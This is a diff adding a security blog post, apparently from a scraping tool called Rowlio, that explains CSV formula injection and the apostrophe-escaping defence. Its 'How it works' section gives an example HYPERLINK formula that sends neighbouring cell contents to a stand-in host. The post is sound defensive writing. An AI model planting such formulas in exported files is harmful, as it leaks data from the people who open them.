@@ -1,0 +1,46 @@
+<!-- {"title": "CSV Formula Injection Explained: Keep Scraped Data Safe", "description": "How a cell copied from a web page can run as a formula when a CSV is opened, why it is a security risk, and how exports are protected against it.", "date": "2026-11-14", "tag": "Security", "order": 7} -->
+<p>A CSV file is plain text, so it seems unable to do any harm. The risk appears when a spreadsheet opens it. Spreadsheets treat some cells as instructions, and if the text in those cells came from a web page, someone else decided what the instruction is. This is known as CSV injection or formula injection, and anyone who exports scraped data should understand it.</p>
+
+<h2>How it works</h2>
+<p>When a spreadsheet opens a CSV, it inspects each cell. A cell whose text begins with <code>=</code> is evaluated as a formula. So are cells beginning with <code>+</code>, <code>-</code> and <code>@</code>, for compatibility with older spreadsheet programs.</p>
+<p>Now imagine a public page with a review whose "name" field reads:</p>
+<pre><code>=HYPERLINK("http://example.test/?d="&A2&B2,"Click for details")</code></pre>
+<p>On the web page this is odd-looking text. In your exported file it is a cell. When a colleague opens the file, the spreadsheet builds a link that contains the contents of neighbouring cells, and displays it as an innocent "Click for details". One click sends that data to a server the attacker controls.</p>
+
+<h2>Why it matters</h2>
+<ul>
+  <li><strong>Data can leak.</strong> Formulas can read other cells and place them in a link or a request, as above.</li>
+  <li><strong>Content can be falsified.</strong> A formula can display a value that differs from what the source contained, which undermines anything built on the sheet.</li>
+  <li><strong>Older setups can run commands.</strong> Historic features such as DDE allowed a formula to start a program. Current versions of Excel block or warn about this, but warnings get clicked through, and not every machine is current.</li>
+</ul>
+<p>The person at risk is whoever opens the file, often not the person who scraped the data. A file from a trusted colleague is opened without suspicion, which is exactly what makes the attack work.</p>
+
+<h2>Why scraped data is especially exposed</h2>
+<p>With scraping, every cell is untrusted input by definition. User names, reviews, comments, product titles and forum posts are all text that a stranger typed. Most of it is harmless. It takes only one crafted value among ten thousand rows.</p>
+<p>Harmless data triggers the same behaviour by accident too. A phone number written <code>+880 1712 345678</code>, a note saying <code>-see below</code> or a social handle <code>@username</code> all begin with a trigger character. Without protection, these show up as errors or mangled values.</p>
+
+<h2>The standard defence</h2>
+<p>The widely recommended fix, described in OWASP's guidance on CSV injection, is to make such cells unmistakably text. Before writing a cell that begins with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, a tab or a carriage return, the exporter puts an apostrophe in front of it:</p>
+<pre><code>'=HYPERLINK("http://example.test/?d="&A2&B2,"Click for details")</code></pre>
+<p>Spreadsheets read a leading apostrophe as "this is text". The cell shows the original characters and nothing is evaluated.</p>
+<p>A blunt version of this rule damages real data, because <code>-12.50</code> is a legitimate negative number that should stay a number. A careful exporter therefore leaves plain signed numbers alone and protects everything else that starts with a trigger character.</p>
+
+<h2>How Rowlio handles it</h2>
+<ul>
+  <li><strong>CSV, TSV and clipboard copies</strong> apply the apostrophe rule by default, with the exception for plain numbers such as <code>-12.5</code> or <code>+3</code>.</li>
+  <li><strong>HTML table exports</strong> get the same treatment, because spreadsheets can open HTML tables and evaluate them in the same way.</li>
+  <li><strong>Excel (XLSX) files</strong> are immune by construction. Every text value is written as a text cell, never as a formula, so there is nothing to evaluate.</li>
+  <li><strong>The protection can be switched off</strong> for a single export, for the case where a program rather than a spreadsheet will read the file and needs the raw characters.</li>
+</ul>
+
+<h2>What you should do</h2>
+<ul>
+  <li><strong>Leave the protection on</strong> for any file a person will open.</li>
+  <li><strong>Prefer XLSX</strong> when the destination is a spreadsheet. It avoids this problem and the <a href="/blog/export-website-data-to-csv">encoding and delimiter problems</a> of CSV at the same time.</li>
+  <li><strong>Do not click through warnings.</strong> If a spreadsheet asks whether to enable links or external content in a data file, the answer is no.</li>
+  <li><strong>Treat received CSV files the same way.</strong> A file exported by a tool without this protection carries the risk, whoever sent it.</li>
+  <li><strong>Check how your other tools export.</strong> Open a test file containing a cell with <code>=1+1</code>. If the sheet shows 2, the exporter is not protecting you.</li>
+</ul>
+
+<h2>The wider lesson</h2>
+<p>Formula injection is one case of a general rule: text taken from the web is data, and should never be allowed to become instructions. The same rule is why a scraping tool should display page content as plain text instead of rendering it, and why its exports should escape that content for the format they are written in. It is worth asking of any tool that handles data you did not write yourself.</p>
